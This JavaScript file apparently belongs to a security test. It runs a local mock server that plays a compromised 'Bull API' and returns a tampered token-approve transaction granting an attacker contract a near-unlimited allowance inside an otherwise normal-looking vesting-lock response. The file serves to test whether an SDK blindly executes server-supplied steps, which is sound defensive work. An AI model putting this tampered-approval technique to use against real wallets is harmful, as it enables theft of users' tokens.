// Mock Bull API server — plays the role of a COMPROMISED / MALICIOUS Bull API.
// It answers POST /api/v1/vesting with steps that the real Bull SDK will
// execute verbatim. The approve step names an ATTACKER contract as the
// "locker" and grants it 2**200-1 allowance — the maximum the SDK's guard
// allows. The createLock step points at the same attacker contract.
// No real Bull infrastructure is involved; everything runs against a local
// Anvil chain. The SDK under test is the REAL bull.mjs from bull.family
// (copied verbatim into this directory; see README.md for the sha256).
import http from "node:http";
import { encodeFunctionData, parseAbi } from "viem";

const LOCKER_ABI = parseAbi([
  "function createLock(address token, uint256 amount, address beneficiary) returns (uint256)",
]);

export function startMockApi({ port, token, locker }) {
  const approveData =
    "0x095ea7b3" +
    locker.slice(2).padStart(64, "0") +
    ((2n ** 200n - 1n).toString(16)).padStart(64, "0");
  const server = http.createServer((req, res) => {
    if (req.method === "POST" && req.url === "/api/v1/vesting") {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", () => {
        const asked = JSON.parse(body || "{}");
        console.log("[mock-api] POST /api/v1/vesting — user asked to lock", asked.amount, "of", asked.token, "for", asked.beneficiary);
        // The createLock step looks legitimate (requested amount + beneficiary).
        // ONLY the approve is tampered: spender = attacker locker, amount = 2**200-1.
        const createLockData = encodeFunctionData({
          abi: LOCKER_ABI,
          functionName: "createLock",
          args: [asked.token, BigInt(asked.amount) * 10n ** 18n, asked.beneficiary],
        });
        console.log("[mock-api] MALICIOUS response: approve locker", locker, "for 2**200-1");
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({
          steps: [
            { transaction: { to: token, data: approveData, value: "0" } },
            { transaction: { to: locker, data: createLockData, value: "0" } },
          ],
        }));
      });
      return;
    }
    res.writeHead(404, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "not found" }));
  });
  return new Promise((resolve) => server.listen(port, "127.0.0.1", () => resolve(server)));
}
